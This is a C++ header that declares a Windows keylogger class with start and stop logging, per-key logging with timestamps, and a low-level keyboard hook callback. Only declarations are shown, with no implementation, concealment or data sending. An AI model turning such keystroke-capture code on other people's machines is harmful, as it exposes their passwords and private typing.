#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <fstream>      // For file operations (ofstream)
#include <windows.h>    // For Windows API (hooks, messages)
#include <ctime>        // For timestamps

using namespace std;

/// @brief Custom message to stop the keylogger
#define WM_STOP (WM_USER + 1)

/**
 * @class KeyLogger
 * @brief Captures keyboard input and logs keystrokes to a file with timestamps.
 *
 * The KeyLogger class allows starting and stopping logging,
 * recording printable characters and special keys.
 */
class KeyLogger {
private:
    /// Output file stream to store keystrokes
    ofstream keyStrokes;

    /// Flag indicating whether logging is active
    bool isLogging;

public:
    /// @brief Constructs a KeyLogger instance with logging disabled.
    KeyLogger() : isLogging(false) {}

    /**
     * @brief Starts logging keystrokes to the specified file.
     * @param filename Name of the log file.
     * @return true if the file was successfully opened, false otherwise.
     */
    bool startLogging(const string &filename);

    /// @brief Stops logging and closes the file.
    void stopLogging();

    /**
     * @brief Logs a single key press.
     * @param key Virtual-key code of the pressed key.
     *
     * Handles printable ASCII characters and special keys
     * like Backspace, Enter, Arrow keys, etc.
     */
    void logKey(int key);

private:
    /**
     * @brief Gets the current system time as a human-readable string.
     * @return Current time string in format "Wed Aug 28 12:34:56 2025".
     */
    string getCurrentTime();
};

/// @brief Global KeyLogger instance accessible from keyboard hook
extern KeyLogger keylogger;

/**
 * @brief Callback function for low-level keyboard events.
 * @param nCode Hook code.
 * @param wParam Message type (WM_KEYDOWN, WM_KEYUP, etc.)
 * @param lParam Pointer to KBDLLHOOKSTRUCT containing key info.
 * @return LRESULT value passed to CallNextHookEx.
 */
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

#endif // KEYLOGGER_H